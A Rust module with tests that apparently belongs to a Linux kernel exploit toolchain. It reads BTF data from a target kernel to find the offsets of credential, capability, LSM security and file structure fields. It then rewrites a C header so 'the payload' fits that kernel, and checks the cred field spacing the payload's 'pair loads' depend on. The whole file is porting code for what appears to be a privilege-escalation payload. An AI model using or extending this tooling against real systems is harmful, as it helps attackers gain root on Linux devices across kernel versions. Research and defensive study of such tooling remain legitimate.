// SPDX-License-Identifier: GPL-3.0-only
//! Retarget the payload's struct offsets and prove them against the target.
//!

// Layout definitions for the payload.
use crate::btf::{self, Layout};

pub const FIELDS: &[(&str, &str, &str)] = &[
    ("CA_TASK_CRED", "task_struct", "cred"),
    ("CA_TASK_NAMEIDATA", "task_struct", "nameidata"),
    ("CA_CRED_UID", "cred", "uid"),
    ("CA_CRED_EUID", "cred", "euid"),
    ("CA_CRED_FSUID", "cred", "fsuid"),
    ("CA_CRED_CAP_EFF", "cred", "cap_effective"),
    ("CA_CRED_SECURITY", "cred", "security"),
    ("CA_FILE_F_PATH", "file", "f_path"),
    ("CA_FILE_F_INODE", "file", "f_inode"),
    ("CA_FILE_F_MODE", "file", "f_mode"),
    ("CA_INODE_SECURITY", "inode", "i_security"),
    ("CA_DENTRY_INODE", "dentry", "d_inode"),
    ("CA_NAMEI_PATH", "nameidata", "path"),
    ("CA_NAMEI_FLAGS", "nameidata", "flags"),
    ("CA_PATH_DENTRY", "path", "dentry"),
    ("CA_AUDIT_U_FILE", "common_audit_data", "u"),
    
    ("CA_DENTRY_NAME", "dentry", "d_name"),
    ("CA_DENTRY_INAME", "dentry", "d_iname"),
    ("CA_QSTR_LEN", "qstr", "len"),
    ("CA_QSTR_NAME", "qstr", "name"),
];

pub const REFERENCE: &[(&str, u64)] = &[
    ("CA_TASK_CRED", 2080),
    ("CA_TASK_NAMEIDATA", 2112),
    ("CA_CRED_UID", 8),
    ("CA_CRED_EUID", 24),
    ("CA_CRED_FSUID", 32),
    ("CA_CRED_CAP_EFF", 64),
    ("CA_CRED_SECURITY", 128),
    ("CA_FILE_F_PATH", 168),
    ("CA_FILE_F_INODE", 184),
    ("CA_FILE_F_MODE", 20),
    ("CA_INODE_SECURITY", 56),
    ("CA_DENTRY_INODE", 48),
    ("CA_NAMEI_PATH", 0),
    ("CA_NAMEI_FLAGS", 56),
    ("CA_PATH_DENTRY", 8),
    ("CA_AUDIT_U_FILE", 8),
    
    ("CA_DENTRY_NAME", 32),
    ("CA_DENTRY_INAME", 56),
    ("CA_QSTR_LEN", 4),
    ("CA_QSTR_NAME", 8),
];

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Offset {
    pub name: &'static str,
    pub structure: &'static str,
    pub member: &'static str,
    pub value: u64,
    pub reference: u64,
}

impl Offset {
    pub fn moved(&self) -> bool {
        self.value != self.reference
    }
}

pub fn derive(kernel: &[u8]) -> Result<Vec<Offset>, String> {
    let layout = btf::read_layout(kernel).map_err(|e| format!("LAYOUT_BTF_FAILED {e}"))?;
    resolve(&layout)
}

fn resolve(layout: &Layout) -> Result<Vec<Offset>, String> {
    let mut out = Vec::with_capacity(FIELDS.len());
    for (name, structure, member) in FIELDS {
        let value = layout
            .get(structure, member)
            .ok_or_else(|| format!("LAYOUT_FIELD_MISSING {structure}.{member}"))?;
        let reference = REFERENCE
            .iter()
            .find(|(n, _)| n == name)
            .map(|(_, v)| *v)
            .ok_or_else(|| format!("LAYOUT_REFERENCE_MISSING {name}"))?;
        out.push(Offset { name, structure, member, value, reference });
    }
    let get = |name: &str| out.iter().find(|o| o.name == name).map(|o| o.value).unwrap();
    
    if get("CA_CRED_EUID") < get("CA_CRED_UID")
        || get("CA_CRED_EUID") - get("CA_CRED_UID") != 16
    {
        return Err(format!(
            "LAYOUT_CRED_PAIR_SPACING euid-uid is {:#x}, the payload needs 16",
            get("CA_CRED_EUID").wrapping_sub(get("CA_CRED_UID"))
        ));
    }
    if get("CA_CRED_FSUID") < get("CA_CRED_EUID")
        || get("CA_CRED_FSUID") - get("CA_CRED_EUID") != 8
    {
        return Err(format!(
            "LAYOUT_CRED_PAIR_SPACING fsuid-euid is {:#x}, the payload needs 8",
            get("CA_CRED_FSUID").wrapping_sub(get("CA_CRED_EUID"))
        ));
    }
    for name in ["CA_CRED_UID", "CA_CRED_EUID"] {
        if get(name) % 4 != 0 {
            return Err(format!("LAYOUT_CRED_UNALIGNED {name} = {:#x}", get(name)));
        }
    }
    for offset in &out {
        if offset.value >= 1 << 20 {
            return Err(format!("LAYOUT_OFFSET_IMPLAUSIBLE {} = {}", offset.name, offset.value));
        }
    }
    Ok(out)
}

pub fn render_header(template: &str, offsets: &[Offset]) -> Result<String, String> {
    let mut text = template.to_string();
    for offset in offsets {
        let needle = format!("#define {} ", offset.name);
        let start = text
            .find(&needle)
            .ok_or_else(|| format!("LAYOUT_TEMPLATE_MISSING {}", offset.name))?;
        let after = start + needle.len();
        let end = text[after..]
            .find('\n')
            .map(|i| after + i)
            .ok_or_else(|| format!("LAYOUT_TEMPLATE_TRUNCATED {}", offset.name))?;
        let existing = text[after..end].to_string();
        let digits = existing.trim_start();
        let pad = existing.len() - digits.len();
        if digits.trim().parse::<u64>().is_err() {
            return Err(format!("LAYOUT_TEMPLATE_NOT_NUMERIC {} = {}", offset.name, digits.trim()));
        }
        
        let digits_len = digits.trim_end().len();
        text.replace_range(after + pad..after + pad + digits_len, &offset.value.to_string());
    }
    Ok(text)
}

pub fn read_header(text: &str) -> Result<Vec<(&'static str, u64)>, String> {
    let mut out = Vec::with_capacity(FIELDS.len());
    for (name, _, _) in FIELDS {
        let name: &'static str = name;
        let needle = format!("#define {} ", name);
        let start = text
            .find(&needle)
            .ok_or_else(|| format!("LAYOUT_HEADER_MISSING {name}"))?;
        let after = start + needle.len();
        let end = text[after..].find('\n').map(|i| after + i).unwrap_or(text.len());
        let value: u64 = text[after..end]
            .trim()
            .parse()
            .map_err(|_| format!("LAYOUT_HEADER_NOT_NUMERIC {name}"))?;
        out.push((name, value));
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn sample(dir: &str) -> Vec<u8> {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../../../research/three-device-dynamic");
        std::fs::read(root.join(dir).join("kernel.bin")).expect("kernel fixture")
    }

    fn template() -> String {
        std::fs::read_to_string(Path::new(env!("CARGO_MANIFEST_DIR")).join("layout.h")).expect("layout.h")
    }

    #[test]
    fn linux61_offsets_differ_from_the_reference_core() {
        let kernel = sample("1ce5a4f8b813ed21");
        let offsets = derive(&kernel).expect("layout");
        assert_eq!(offsets.len(), FIELDS.len());
        let cred = offsets.iter().find(|o| o.name == "CA_TASK_CRED").unwrap();
        assert_eq!(cred.value, 2104);
        assert!(cred.moved(), "task_struct.cred must differ from the reference 2080");
        let path = offsets.iter().find(|o| o.name == "CA_FILE_F_PATH").unwrap();
        assert_eq!(path.value, 16);
        let inode = offsets.iter().find(|o| o.name == "CA_FILE_F_INODE").unwrap();
        assert_eq!(inode.value, 32);
        println!(
            "NATIVE_LAYOUT_61 moved={} cred={} f_path={} f_inode={}",
            offsets.iter().filter(|o| o.moved()).count(),
            cred.value,
            path.value,
            inode.value
        );
    }

    #[test]
    fn reference_kernel_reproduces_the_shipped_header() {
        let kernel = sample("2178360d572d1f63");
        let offsets = derive(&kernel).expect("layout");
        assert!(offsets.iter().all(|o| !o.moved()), "reference layout must not move");
        let rendered = render_header(&template(), &offsets).unwrap();
        assert_eq!(rendered, template(), "rendering for the reference kernel must be a no-op");
    }

    #[test]
    fn retargeted_header_carries_the_target_numbers() {
        let kernel = sample("1ce5a4f8b813ed21");
        let offsets = derive(&kernel).expect("layout");
        let rendered = render_header(&template(), &offsets).unwrap();
        let read_back = read_header(&rendered).unwrap();
        for offset in &offsets {
            let got = read_back.iter().find(|(n, _)| *n == offset.name).unwrap().1;
            assert_eq!(got, offset.value, "header disagrees for {}", offset.name);
        }
        
        let read_back = read_header(&rendered).unwrap();
        let value = |name: &str| read_back.iter().find(|(n, _)| *n == name).unwrap().1;
        assert_eq!(value("CA_FILE_F_PATH"), 16);
        assert_eq!(value("CA_TASK_CRED"), 2104);
    }

    #[test]
    fn refuses_a_cred_layout_the_pair_loads_cannot_express() {
        let mut layout = Layout { offsets: Vec::new() };
        for (name, structure, member) in FIELDS {
            let value = match *name {
                "CA_CRED_UID" => 8,
                "CA_CRED_EUID" => 32, 
                _ => 0,
            };
            layout.offsets.push((structure, member, value));
        }
        let err = resolve(&layout).unwrap_err();
        assert!(err.starts_with("LAYOUT_CRED_PAIR_SPACING"), "{err}");
    }

    #[test]
    fn refuses_a_template_that_lost_a_name() {
        let kernel = sample("1ce5a4f8b813ed21");
        let offsets = derive(&kernel).expect("layout");
        let broken = template().replace("#define CA_FILE_F_INODE ", "#define CA_FILE_F_INODE_X ");
        assert!(render_header(&broken, &offsets).is_err());
    }
}
